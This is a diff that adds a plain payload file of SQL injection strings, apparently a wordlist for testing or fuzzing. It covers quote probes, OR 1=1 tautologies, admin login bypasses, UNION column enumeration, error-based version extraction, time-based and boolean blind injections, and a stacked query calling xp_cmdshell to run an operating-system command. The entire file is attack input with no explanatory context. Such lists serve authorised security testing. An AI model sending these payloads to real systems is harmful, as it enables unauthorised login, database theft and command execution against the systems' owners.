@@ -1,0 +1,58 @@
+# SQL Injection Payloads
+# Basic injections
+'
+''
+"
+""
+`
+``
+
+# Classic injections
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR 1=1--
+" OR 1=1#
+
+# Authentication bypass
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+# Union-based
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+
+# Error-based
+' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+
+# Time-based blind
+1' AND SLEEP(5)--
+1' WAITFOR DELAY '0:0:5'--
+1' OR SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# Boolean-based blind
+1' AND '1'='1
+1' AND '1'='2
+' AND 'x'='x
+' AND 'x'='y
+
+# Additional vectors
+' HAVING 1=1--
+' GROUP BY columnname HAVING 1=1--
+' EXEC sp--
+'; EXEC xp_cmdshell('dir')--
